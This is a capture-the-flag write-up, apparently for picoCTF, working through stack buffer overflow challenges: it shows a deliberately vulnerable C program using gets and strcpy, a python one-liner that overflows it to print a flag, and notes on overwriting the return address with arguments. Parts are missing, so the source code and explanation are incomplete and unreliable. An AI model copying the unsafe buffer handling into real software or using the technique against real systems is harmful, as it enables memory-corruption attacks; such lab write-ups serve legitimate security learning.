## Buffer Overflow 0

### Description

> Let's start off simple, can you overflow the correct buffer?

### Solution

Let's take a look at the binary and see what it has:

```bash

RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Full RELRO      No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   84 Symbols        No    0               4               vuln
```

A 32-bit ELF file and no Stack Canary

Let's take a look at what's in the source code:
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>

#define FLAGSIZE_MAX 64

void sigsegv_handler(int sig) {
  printf("%s\n", flag);
  fflush(stdout);
  exit(1);
}

  char buf2[16];
  strcpy(buf2, input);
}

int main(int argc, char **argv){

  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(flag,FLAGSIZE_MAX,f);
  signal(SIGSEGV, sigsegv_handler); // Set up signal handler

  gid_t gid = getegid();
  setresgid(gid, gid, gid);


  printf("Input: ");
  fflush(stdout);
  char buf1[100];
  gets(buf1);
  vuln(buf1);
  printf("The program will exit now\n");
  return 0;
}

```

&#x20;In function **sigsegv\_handler()**

```c
void sigsegv_handler(int sig) {
  printf("%s\n", flag);
  fflush(stdout);
  exit(1);
}
```

We see that “SIGSEGV” stands for **segmentation fault,** which is an error generated by the memory protection hardware whenever it tries to access a memory address that is restricted or does not exist. If the **printf()** flag is in **sigsegv\_handler()**, then we can think about how to trigger the **segmentation fault**.

Continuing with **main()**, this function uses the **gets()** function, a function that is quite dangerous because it allows us to enter input without checking its length. So we can input more than 100 bytes and pass any 100 bytes of input to the function **vuln().** Our input can overwrite the 16 bytes **buf2** in vuln() and can lead to **segmentation fault**

So we can try to give the input with length 16 bytes first and then increase it by 4 bytes at a time until it causes an error

```bash
➜  BOF_0 python3 -c "print('A'*(16+3))" | ./vuln
Input: The program will exit now
➜  BOF_0 python3 -c "print('A'*(16+4))" | ./vuln
Input: FLAG{helloiloveyou}
```

or that address is called the address of saved EIP. When ret is executed, the value at ESP will be assigned to EIP and make the program flow execute accordingly. So what we need to do is to control their return address after ret (here is the win function) and will solve this problem

## Buffer Overflow 2

### Description

> Control the return address and arguments

### Solution

The steps to find offset to EIP are still the same as BOF0 and BOF1, so I will skip this step

In the source code, there is a section&#x20;

```c
  if (arg1 != 0xCAFEF00D)
    return;
  if (arg2 != 0xF00DF00D)
    return;
```

That is, when we overwrite EIP with the address of the win function, we need to pass 2 more values ​​​​arg1 and arg2 to overcome the condition

When we enter a large enough buffer to reach EIP and after returning, it will jump to the win function. In particular, we need to recreate a stack for the win function similar to this:

![alt_text](/assets/img/picoCTF/bof.png)

### Exploit

